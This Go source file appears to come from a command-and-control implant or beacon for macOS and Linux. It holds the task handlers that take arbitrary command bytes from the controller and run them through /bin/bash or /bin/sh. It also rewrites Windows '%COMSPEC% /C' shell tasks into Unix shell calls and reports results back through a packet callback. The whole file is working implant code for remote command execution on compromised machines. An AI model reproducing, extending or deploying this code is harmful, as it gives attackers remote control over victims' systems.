//go:build darwin || linux

package command

import (
	"errors"
	"main/packet"
	"os"
	"os/exec"
	"strings"
)

func Exec(b []byte) error {
	sh_path := "/bin/bash"
	_, err := os.Stat(sh_path)
	if err != nil {
		sh_path = "/bin/sh"
	}
	cmd := exec.Command(sh_path, "-c", string(b))
	err = cmd.Start()
	if err != nil {
		return err
	}
	packet.PushResult(packet.CALLBACK_OUTPUT, []byte("exec success"))
	return nil
}

// implement of run and shell cmd
func runImpl(b []byte) error {
	pathByte, argsByte, _, err := parseCommandShell(b)
	if err != nil {
		return err
	}
	path := strings.Trim(string(pathByte), " ")
	args := strings.Trim(string(argsByte), " ")
	sh_path := "/bin/bash"
	_, err = os.Stat(sh_path)
	if err != nil {
		sh_path = "/bin/sh"
	}

	if path == "%COMSPEC%" && strings.HasPrefix(args, "/C") {
		args = args[3:]
		cmd := exec.Command(sh_path, "-c", args)
		return RunAsync(cmd)
	} else {
		// there shouldn't be a path in run cmd
		if len(path) != 0 {
			return errors.New("get a path from run cmd")
		}
		parts := strings.Split(args, " ")
		var cmd *exec.Cmd
		if len(parts) > 1 {
			cmd = exec.Command(parts[0], parts[1:]...)
		} else {
			cmd = exec.Command(parts[0])
		}
		return RunAsync(cmd)
	}
}
